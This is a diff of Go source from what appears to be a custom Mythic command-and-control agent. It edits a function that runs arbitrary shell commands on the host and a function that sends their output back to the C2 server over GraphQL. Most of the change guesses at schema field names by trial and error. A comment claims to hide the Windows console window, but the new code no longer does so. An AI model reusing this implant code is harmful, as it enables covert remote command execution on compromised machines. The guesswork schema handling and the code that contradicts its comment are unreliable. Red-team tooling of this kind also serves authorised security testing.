@@ -254,7 +254,10 @@ func executeShell(command string) string {
                 cmd = exec.Command("/bin/sh", "-c", command)
         }
         
-        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        // Hide window on Windows
+        if runtime.GOOS == "windows" {
+                cmd.SysProcAttr = &syscall.SysProcAttr{}
+        }
         output, err := cmd.CombinedOutput()
         
         if err != nil {
@@ -379,44 +382,84 @@ func sendTaskResponse(taskID string, output string) error {
                 return fmt.Errorf("Invalid task ID: %v", err)
         }
         
-        // First, let's try to create a proper response entry using Mythic's actual schema
-        responseQuery := `
-        mutation createResponse($task_id: Int!, $response: String!) {
-                insert_response_one(object: {
-                        task_id: $task_id,
-                        response: $response
-                }) {
-                        id
+        // Query the schema first to understand available fields
+        schemaQuery := `
+        query IntrospectResponse {
+                __type(name: "response_insert_input") {
+                        inputFields {
+                                name
+                                type {
+                                        name
+                                }
+                        }
                 }
         }`
         
-        responseVars := map[string]interface{}{
-                "task_id": taskIDInt,
-                "response": output,
+        schemaResp, err := makeGraphQLRequest(schemaQuery, map[string]interface{}{})
+        if err == nil && len(schemaResp.Errors) == 0 {
+                logEvent("Schema query successful - analyzing response fields")
         }
         
-        resp, err := makeGraphQLRequest(responseQuery, responseVars)
-        if err == nil && len(resp.Errors) == 0 {
-                logEvent("Response created successfully using insert_response_one")
-        } else {
-                logEvent(fmt.Sprintf("Response creation failed: %v", resp.Errors))
+        // Try different field names based on common Mythic patterns
+        responseFields := []map[string]string{
+                {"field": "response", "desc": "standard response field"},
+                {"field": "user_output", "desc": "user output field"},
+                {"field": "output", "desc": "output field"},
+                {"field": "result", "desc": "result field"},
+                {"field": "content", "desc": "content field"},
+        }
+        
+        responseSuccess := false
+        for _, fieldInfo := range responseFields {
+                responseQuery := fmt.Sprintf(`
+                mutation createResponse($task_id: Int!, $output: String!) {
+                        insert_response_one(object: {
+                                task_id: $task_id,
+                                %s: $output
+                        }) {
+                                id
+                        }
+                }`, fieldInfo["field"])
                 
-                // Try alternative response creation
-                altResponseQuery := `
-                mutation createResponseAlt($task_id: Int!, $response: String!) {
+                responseVars := map[string]interface{}{
+                        "task_id": taskIDInt,
+                        "output": output,
+                }
+                
+                resp, err := makeGraphQLRequest(responseQuery, responseVars)
+                if err == nil && len(resp.Errors) == 0 {
+                        logEvent(fmt.Sprintf("Response created successfully using field: %s", fieldInfo["field"]))
+                        responseSuccess = true
+                        break
+                } else {
+                        logEvent(fmt.Sprintf("Field %s failed: %v", fieldInfo["field"], resp.Errors))
+                }
+        }
+        
+        if !responseSuccess {
+                logEvent("All response field attempts failed, trying bulk insert")
+                
+                // Try bulk insert method
+                bulkQuery := `
+                mutation createResponseBulk($task_id: Int!, $output: String!) {
                         insert_response(objects: [{
                                 task_id: $task_id,
-                                response: $response
+                                user_output: $output
                         }]) {
                                 affected_rows
                         }
                 }`
                 
-                resp, err = makeGraphQLRequest(altResponseQuery, responseVars)
+                bulkVars := map[string]interface{}{
+                        "task_id": taskIDInt,
+                        "output": output,
+                }
+                
+                resp, err := makeGraphQLRequest(bulkQuery, bulkVars)
                 if err == nil && len(resp.Errors) == 0 {
-                        logEvent("Response created using insert_response")
+                        logEvent("Response created using bulk insert with user_output")
                 } else {
-                        logEvent(fmt.Sprintf("Alternative response creation failed: %v", resp.Errors))
+                        logEvent(fmt.Sprintf("Bulk insert failed: %v", resp.Errors))
                 }
         }
         
@@ -435,14 +478,14 @@ func sendTaskResponse(taskID string, output string) error {
                 "task_id": taskIDInt,
         }
         
-        resp, err = makeGraphQLRequest(updateQuery, updateVars)
+        updateResp, err := makeGraphQLRequest(updateQuery, updateVars)
         if err != nil {
                 return fmt.Errorf("Failed to update task: %v", err)
         }
         
-        if len(resp.Errors) > 0 {
-                logEvent(fmt.Sprintf("Task update errors: %v", resp.Errors))
-                return fmt.Errorf("GraphQL errors: %v", resp.Errors)
+        if len(updateResp.Errors) > 0 {
+                logEvent(fmt.Sprintf("Task update errors: %v", updateResp.Errors))
+                return fmt.Errorf("GraphQL errors: %v", updateResp.Errors)
         } else {
                 logEvent("Task marked as completed successfully")
         }
